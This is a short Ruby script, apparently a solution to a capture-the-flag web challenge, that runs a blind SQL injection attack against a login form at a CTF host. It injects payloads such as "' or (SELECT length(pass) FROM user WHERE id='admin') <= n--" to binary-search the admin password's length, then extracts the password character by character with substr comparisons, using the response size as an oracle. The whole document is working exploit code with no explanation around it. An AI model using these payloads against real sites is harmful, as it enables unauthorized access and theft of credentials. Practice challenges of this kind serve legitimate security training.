require 'uri'
require 'net/http'

module Login
	@@uri  = URI.parse 'http://ctfq.sweetduet.info:10080/~q6/'

	def self.get_password_size
		n_min = 1
		n_max = 10000

		while true
			n = (n_min + n_max)/2
			param = { id: "' or (SELECT length(pass) FROM user WHERE id='admin') <= #{n}--"}
			res = Net::HTTP.post_form @@uri, param

			if res.body.length == 2167
				n_max = n
			else
				n_min = n
			end

			if (n_max - n_min) <= 1
				puts "password has #{n_max} chars"
				break
			end
		end

		n_max

	end

	def self.get_password password_length
		pass = ''
		(1..password_length).each do |n|
			(33..127).each do |charcode|
				param = { id: "' or substr((SELECT pass FROM user WHERE id='admin'), #{n}, 1)=\"#{charcode.chr}\"--" }
				res = Net::HTTP.post_form @@uri, param

				if res.body.length == 2167
					pass += charcode.chr
					puts "hit!! #{n}:#{charcode.chr}"
					break
				end
			end
		end

		puts "password is #{pass}"
	end
end

pass_len = Login.get_password_size
Login.get_password pass_len
